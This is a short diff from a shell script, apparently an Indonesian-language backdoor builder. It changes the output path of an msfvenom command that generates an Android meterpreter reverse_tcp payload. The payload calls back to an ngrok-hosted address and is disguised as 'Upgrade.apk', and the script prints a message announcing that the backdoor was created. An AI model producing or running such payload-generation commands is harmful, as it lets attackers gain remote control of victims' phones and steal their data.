@@ -140,7 +140,7 @@ if [ $start = "y" ]; then
         echo "===================================="
         echo
         sleep 3
-        gnome-terminal -x msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_ngrok LPORT=$port_ngrok -o Upgrade.apk
+        gnome-terminal -x msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_ngrok LPORT=$port_ngrok R> /sdcard/Upgrade.apk
         sleep 5
         echo "Backdoor berhasil dibuat"        
         echo
